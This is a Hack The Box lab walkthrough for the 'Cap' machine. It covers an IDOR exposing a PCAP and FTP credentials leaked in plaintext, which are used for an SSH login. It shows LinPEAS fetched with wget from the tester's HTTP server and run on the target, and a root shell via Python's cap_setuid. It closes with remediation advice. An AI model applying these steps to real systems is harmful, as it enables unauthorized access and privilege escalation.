---
title: "CAP"
description: "Exploit an IDOR to download a PCAP, recover FTP credentials, and abuse a Python Linux capability to escalate to root."
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
publishedAt: 2026-07-29
tags: ["idor", "wireshark", "ftp", "linux", "capabilities", "privesc"]
language: "en"
translationKey: "hack-the-box/cap"
draft: false
featured: true
cover: "/images/cap/cap-02.png"
---

> This write-up was produced in a controlled lab environment. Only apply the techniques below to systems you are authorized to test.

## Service enumeration

Scan the target for open ports:

```bash
nmap -sS -sC -sV 10.129.13.241
```

The results identify three notable services:

| Port | Service | Version |
| --- | --- | --- |
| `21/tcp` | FTP | vsftpd 3.0.3 |
| `22/tcp` | SSH | OpenSSH 8.2p1 Ubuntu |
| `80/tcp` | HTTP | Gunicorn |

![Nmap scan results](/images/cap/cap-01.png)

## Exploiting the IDOR to download a PCAP

The web application provides a **Security Snapshot** feature. After creating a snapshot, the browser opens a URL such as:

```text
/data/1
```

![The Security Snapshot page at data 1](/images/cap/cap-02.png)

The value after `/data/` is the snapshot ID. The application returns the object without checking ownership, so other IDs may expose snapshots belonging to other users.

Use Burp Suite Intruder with numeric payloads from `0` through `10`:

![Configuring the numeric payload in Burp Suite Intruder](/images/cap/cap-03.png)

IDs `0` through `3` return valid responses, while higher values redirect:

![Snapshot ID enumeration results](/images/cap/cap-04.png)

Open `/data/0` and download `0.pcap`:

![The snapshot at data 0](/images/cap/cap-05.png)

## Analyzing the PCAP and recovering credentials

Open `0.pcap` in Wireshark. The capture shows FTP transmitting sensitive data in plaintext:

![FTP credentials visible in Wireshark](/images/cap/cap-06.png)

Follow the TCP stream to inspect the complete FTP session:

![The FTP credentials in the TCP stream](/images/cap/cap-07.png)

The recovered credentials are:

```text
Username: nathan
Password: Buck3tH4TF0RM3!
```

Use them to sign in over SSH:

```bash
ssh nathan@10.129.13.241
```

After logging in, read `user.txt`:

![Logging in over SSH and reading the user flag](/images/cap/cap-08.png)

## Enumerating privilege-escalation paths

The next objective is to find a binary with a capability that can be abused for root access:

![The request to find a binary with a special capability](/images/cap/cap-09.png)

Use [LinPEAS](https://github.com/peass-ng/PEASS-ng) to enumerate escalation paths. Because the target cannot access the Internet, download `linpeas.sh` on the local machine first:

![The target cannot reach the Internet](/images/cap/cap-10.png)

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
```

![Downloading LinPEAS locally](/images/cap/cap-11.png)

Find the local VPN interface address:

```bash
ifconfig
```

![The tun0 interface address](/images/cap/cap-12.png)

Start an HTTP server in the directory containing `linpeas.sh`:

```bash
python3 -m http.server 8000
```

![Starting the HTTP server on port 8000](/images/cap/cap-13.png)

Download and run LinPEAS from the target:

```bash
wget http://10.10.14.69:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Downloading and running LinPEAS on the target](/images/cap/cap-14.png)

LinPEAS reports several findings:

![LinPEAS identifies PwnKit](/images/cap/cap-15.png)

![LinPEAS identifies a PackageKit-related issue](/images/cap/cap-16.png)

The critical finding is that `/usr/bin/python3.8` has the `cap_setuid` capability:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

![Python 3.8 has the cap_setuid capability](/images/cap/cap-17.png)

## Escalating to root

`cap_setuid` lets a process change its UID. Start Python 3.8, set the UID to `0`, and launch a shell:

```bash
/usr/bin/python3.8
```

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

Verify access with `id` or `whoami`, then read `root.txt`:

![Successful privilege escalation and the root flag](/images/cap/cap-18.png)

## Conclusion

### IDOR — Broken Access Control

An IDOR occurs when an application exposes an object through an ID or parameter without checking whether the current user may access it. Here, changing `/data/{id}` downloads a snapshot that does not belong to the signed-in account.

**Recommendations:**

- Check ownership or access rights for every object on the server.
- Do not rely on unpredictable IDs to protect resources.
- Apply least privilege to users and services.

### Insecure Communication — CWE-319

FTP sends usernames and passwords in plaintext, allowing anyone who can read the network traffic to recover credentials.

**Recommendations:**

- Replace FTP with SFTP or FTPS.
- Encrypt sensitive data in transit.
- Do not reuse credentials across services.

### Linux capabilities

Assigning `cap_setuid` to a general-purpose interpreter such as Python creates a direct path to privilege escalation.

**Recommendations:**

- Remove unnecessary capabilities:

  ```bash
  sudo setcap -r /usr/bin/python3.8
  ```

- Audit capabilities regularly:

  ```bash
  getcap -r / 2>/dev/null
  ```

- Grant only the minimum capabilities required by purpose-built binaries.
